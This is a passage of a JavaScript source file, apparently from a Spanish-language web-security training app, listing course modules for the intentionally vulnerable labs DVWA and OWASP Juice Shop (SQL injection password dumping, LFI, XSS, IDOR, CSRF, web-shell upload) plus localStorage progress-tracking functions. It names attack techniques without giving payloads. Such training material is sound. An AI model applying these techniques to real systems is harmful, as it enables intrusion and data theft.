    categoria: 'Inyeccion SQL',
    nivel: 'Intermedio',
    descripcion: 'Aprenderas a consultar informacion privada en la base de datos, obteniendo los nombres de los usuarios y sus contrasenas.',
    duracionEstimada: '25 min',
    tags: ['UNION SELECT', 'ORDER BY', 'MySQL Hash Dump'],
  },
  {
    orden: 7,
    fase: 2,
    faseTitulo: 'Fase 2 · Vulnerabilidades en Servidor y Backend',
    faseNivel: 'Intermedio',
    faseIcono: 'server',
    id: 'dvwa-fi',
    lab: 'DVWA',
    moduloId: 'dvwa-fi',
    titulo: 'Lectura de Archivos Confidenciales (LFI)',
    categoria: 'Inclusion de Archivos',
    nivel: 'Intermedio',
    descripcion: 'Veras como explorar las carpetas internas del servidor a traves de la direccion web para leer archivos que deberian ser secretos.',
    duracionEstimada: '20 min',
    tags: ['LFI', 'Directory Traversal', 'php://filter'],
  },
  {
    orden: 8,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'dvwa-xss-stored',
    lab: 'DVWA',
    moduloId: 'dvwa-xss-stored',
    titulo: 'Codigo Malicioso Permanente (XSS Almacenado)',
    categoria: 'Inyeccion Web (XSS)',
    nivel: 'Intermedio',
    descripcion: 'Entendreras el peligro de guardar comentarios con codigo malicioso que se activa automaticamente cada vez que alguien visita la pagina.',
    duracionEstimada: '20 min',
    tags: ['XSS Stored', 'Persistencia', 'Bypass HTML Client-Side'],
  },
  {
    orden: 9,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'juice-logic',
    lab: 'OWASP Juice Shop',
    moduloId: 'juice-logic',
    titulo: 'Modificacion de Precios y Carrito de Compras',
    categoria: 'Logica de Negocio',
    nivel: 'Intermedio',
    descripcion: 'Descubriras como alterar los datos que envia la tienda en segundo plano para cambiar cantidades o conseguir productos gratis.',
    duracionEstimada: '15 min',
    tags: ['Business Logic', 'Manipulacion JSON', 'Burp Repeater'],
  },
  {
    orden: 10,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'juice-idor',
    lab: 'OWASP Juice Shop',
    moduloId: 'juice-idor',
    titulo: 'Acceso a Datos de Otras Cuentas (IDOR)',
    categoria: 'Control de Acceso (IDOR)',
    nivel: 'Intermedio',
    descripcion: 'Aprenderas como cambiar un simple numero en la URL para acceder a las cestas y compras de otros usuarios sin autorizacion.',
    duracionEstimada: '15 min',
    tags: ['IDOR', 'Bypass de Autorizacion', 'REST Endpoint'],
  },
  {
    orden: 11,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'juice-xss',
    lab: 'OWASP Juice Shop',
    moduloId: 'juice-xss',
    titulo: 'Ataques al Navegador en Aplicaciones Modernas',
    categoria: 'Inyeccion Web (XSS)',
    nivel: 'Intermedio',
    descripcion: 'Veras como manipular la interfaz visual de una aplicacion moderna para que ejecute acciones invisibles sin que el usuario se de cuenta.',
    duracionEstimada: '20 min',
    tags: ['DOM XSS', 'SPA Injection', 'Iframe Attack'],
  },
  {
    orden: 12,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'dvwa-upload',
    lab: 'DVWA',
    moduloId: 'dvwa-upload',
    titulo: 'Subida de Archivos y Control del Servidor',
    categoria: 'File Upload / RCE',
    nivel: 'Intermedio',
    descripcion: 'Comprenderas el riesgo de permitir subida de archivos sin verificar su contenido y como un archivo PHP otorga control total del servidor.',
    duracionEstimada: '25 min',
    tags: ['Web Shell', 'Unrestricted File Upload', 'RCE'],
  },
  {
    orden: 13,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'dvwa-csrf',
    lab: 'DVWA',
    moduloId: 'dvwa-csrf',
    titulo: 'Acciones Forzadas en Cuentas Ajenas (CSRF)',
    categoria: 'Ataques de Sesion (CSRF)',
    nivel: 'Intermedio',
    descripcion: 'Entendreras como una pagina trampa puede obligar al navegador de una victima a cambiar su contrasena sin su consentimiento.',
    duracionEstimada: '20 min',
    tags: ['CSRF', 'Session Hijacking', 'Exploit HTML'],
  },
];

export function obtenerRoadmapLab(nombreLab) {
  return ROADMAP_MODULOS[nombreLab] || null;
}

export function obtenerEstadisticasLab(nombreLab, modulos) {
  if (!modulos || modulos.length === 0) {
    return { totalModulos: 0, modulosCompletados: 0, totalPasos: 0, pasosCompletados: 0, porcentaje: 0 };
  }
  let totalPasos = 0;
  let pasosCompletados = 0;
  let modulosCompletados = 0;
  modulos.forEach((mod) => {
    const cantPasos = mod.pasos?.length || 0;
    totalPasos += cantPasos;
    const guardados = obtenerPasosCompletadosModulo(nombreLab, mod.id);
    pasosCompletados += guardados.length;
    if (cantPasos > 0 && guardados.length === cantPasos) {
      modulosCompletados += 1;
    }
  });
  const porcentaje = totalPasos > 0 ? Math.round((pasosCompletados / totalPasos) * 100) : 0;
  return { totalModulos: modulos.length, modulosCompletados, totalPasos, pasosCompletados, porcentaje };
}

const STORAGE_KEY_PREFIX = 'roadmap_pasos_completados_';

export function obtenerPasosCompletadosModulo(nombreLab, moduloId) {
  try {
    const key = `${STORAGE_KEY_PREFIX}${nombreLab}_${moduloId}`;
    const raw = localStorage.getItem(key);
    return raw ? JSON.parse(raw) : [];
  } catch {
    return [];
  }
}

export function alternarPasoModulo(nombreLab, moduloId, pasoIdx) {
  try {
    const key = `${STORAGE_KEY_PREFIX}${nombreLab}_${moduloId}`;
    const actuales = obtenerPasosCompletadosModulo(nombreLab, moduloId);
    let nuevos;
    if (actuales.includes(pasoIdx)) {
      nuevos = actuales.filter((i) => i !== pasoIdx);
    } else {
      nuevos = [...actuales, pasoIdx].sort((a, b) => a - b);
    }
    localStorage.setItem(key, JSON.stringify(nuevos));
    return nuevos;
  } catch {
    return [];
  }
}
